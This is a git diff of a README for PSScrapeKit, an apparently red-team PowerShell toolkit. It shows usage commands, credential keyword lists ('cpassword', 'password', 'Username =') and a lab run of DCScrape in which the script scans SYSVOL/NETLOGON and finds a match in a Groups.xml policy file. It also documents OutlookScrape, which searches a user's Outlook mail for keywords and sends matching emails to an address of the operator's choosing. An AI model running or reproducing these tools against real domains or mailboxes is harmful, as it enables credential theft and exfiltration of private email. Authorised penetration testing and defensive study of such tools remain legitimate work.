@@ -1,9 +1,26 @@
-Just a quick demo of DCScrape_Line_Breaks_For_Readability.ps1 been executed across my domain lab.
+## PSScrapeKit
+
+### What it is
+
+PSScrapeKit is a powershell implementation of ScrapeKit, it consists of two files; DCScraper & OutlookScrape. Each has a specific function for scraping either a DC or Outlook. The outlook scraper will connect to the user's outlook client, search for keywords then queue up any interesting emails and send to an email of your choosing. Whereas the DC one will connect to sysvol and look for specific keywords or a default list.
+
+- DCScrape.ps1
+- OutlookScrape.ps1
+
+### How to Use
+
+#### DCScrape
+Execute the script from a domain connected machine or in a runas session to crawl the DC;
+
+```
+.\DCScrape.ps1
+```
+Just a quick demo of DCScrape_Line_Breaks_For_Readability.ps1 being executed across my domain lab.
 
 Open https://raw.githubusercontent.com/LaresLLC/ScrapingKit/main/PSScrapeKit/DCScrape_Line_Breaks_For_Readability.ps1 then copy and paste into a PowerShell session.
 
-Execution will trigger the script to scrape for the following key words.
-
+Execution will trigger the script to scrape for the following keywords.
+```
 $initialKeywords = @(
 >>     'password', 'cpassword', 'passw', 'cred',
 >>     'Password', 'Cpassword', 'Passw', 'Cred',
@@ -22,12 +39,12 @@ PS C:\Users\user1> $additionalKeywords = @(
 >>     'Username: ', 'username: ', 'Username= ',
 >>     'username= ', 'Username : ', 'username : ',
 >>     'Username = ', 'username = '
-
+```
 
 
 Result of execution:
 
-
+```
 PS C:\Users\user1> # LaresLLC PSScrapingKit 2023
 PS C:\Users\user1> # Neil Lines & Andy Gill
 PS C:\Users\user1> # Line breaks added to enhance readability
@@ -100,6 +117,7 @@ PS C:\Users\user1> Get-ChildItem -Path $netlogonPath -Recurse -File | Where-Obje
 >>         }
 >>     }
 >> }
+
 Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Test\Groups.xml!
 
 
@@ -189,3 +207,25 @@ PS C:\Users\user1> if (-not $matchesFound) {
 >>     Write-Host "No matches found."
 >> }
 PS C:\Users\user1>
+```
+#### OutlookScrape
+Simply import the module then execute it:
+
+```
+ipmo .\OutlookScrape.ps1
+Invoke-OutlookScrape
+```
+
+It will give you two options:
+```
+Select keyword option:
+1. User-defined keywords
+2. Default keywords (password, security, confidential, VPN, WIFI)
+Enter the keyword option: 
+```
+
+Simply select an option then specify an email and the rest will queue up and do its thing.
+
+### Example execution:
+![image](https://github.com/LaresLLC/ScrapingKit/assets/5783068/870ff5d6-2380-4d4f-956b-71f16267feb2)
+![image](https://github.com/LaresLLC/ScrapingKit/assets/5783068/1357b27c-bad5-453b-b4cf-ed244d39d21d)
